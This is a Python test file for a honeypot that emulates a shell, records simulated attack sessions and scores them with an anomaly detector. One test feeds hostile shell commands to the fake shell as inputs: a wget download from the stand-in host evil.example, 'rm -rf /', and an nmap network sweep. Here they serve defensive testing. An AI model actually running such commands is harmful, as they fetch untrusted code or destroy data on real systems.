import asyncio
import json

import pandas as pd

from honeypot import features, report, simulate
from honeypot.detector import Detector
from honeypot.events import EventLog, read
from honeypot.services import respond, serve


def test_commands_are_answered_never_run():
    assert respond("whoami") == "root"
    assert "Saving to" in respond("wget http://evil.example/x")
    assert respond("rm -rf /") == ""
    assert respond("nmap 10.0.0.0/8") == "-bash: nmap: command not found"


def run_traffic(tmp_path, mix, port):
    async def go():
        server = asyncio.create_task(serve(EventLog(tmp_path / "events.jsonl"), "127.0.0.1",
                                           port, port + 1))
        await asyncio.sleep(0.3)
        await simulate.play(mix, tmp_path / "truth.json", shell=port, http_port=port + 1,
                            subnet=30)
        server.cancel()
    asyncio.run(go())
    return read(tmp_path / "events.jsonl"), json.loads((tmp_path / "truth.json").read_text())


def test_attacks_are_recorded_as_sessions(tmp_path):
    events, truth = run_traffic(tmp_path, {"dropper": 1, "web_scanner": 1, "staff": 1}, 24323)
    shell = features.shell_sessions(events)
    dropper = shell[shell["src_ip"].map(lambda ip: truth[ip]["behaviour"]) == "dropper"].iloc[0]
    assert dropper["logged_in"] == 1 and dropper["downloads"] == 1
    assert dropper["evasion"] >= 1 and dropper["privilege"] >= 1
    web = features.http_sessions(events)
    assert web.iloc[0]["requests"] == 8 and web.iloc[0]["scanner_agent"] == 1


def test_the_forest_flags_the_odd_session_out():
    normal = [{"requests": 2, "distinct_paths": 2, "login_posts": i % 2, "not_found": 0,
               "attack_payloads": 0, "scanner_agent": 0, "requests_per_min": 3 + i % 3}
              for i in range(60)]
    attack = {**normal[0], "requests": 40, "distinct_paths": 38, "not_found": 36,
              "attack_payloads": 20, "scanner_agent": 1, "requests_per_min": 300}
    df = pd.DataFrame([*normal, attack]).assign(src_ip=[f"ip{i}" for i in range(61)])
    scored = Detector.fit(df, features.HTTP_FEATURES).score(df)
    assert scored.iloc[0]["src_ip"] == "ip60" and scored.iloc[0]["anomalous"]


def test_evaluation_counts_hits_and_misses():
    scored = pd.DataFrame({"src_ip": ["a", "b", "c", "d"],
                           "anomalous": [True, True, False, False]})
    truth = {"a": {"attack": True}, "b": {"attack": False}, "c": {"attack": True},
             "d": {"attack": False}}
    assert report.evaluate(scored, truth) == {"precision": 0.5, "recall": 0.5, "tp": 1,
                                              "fp": 1, "fn": 1, "n": 4}
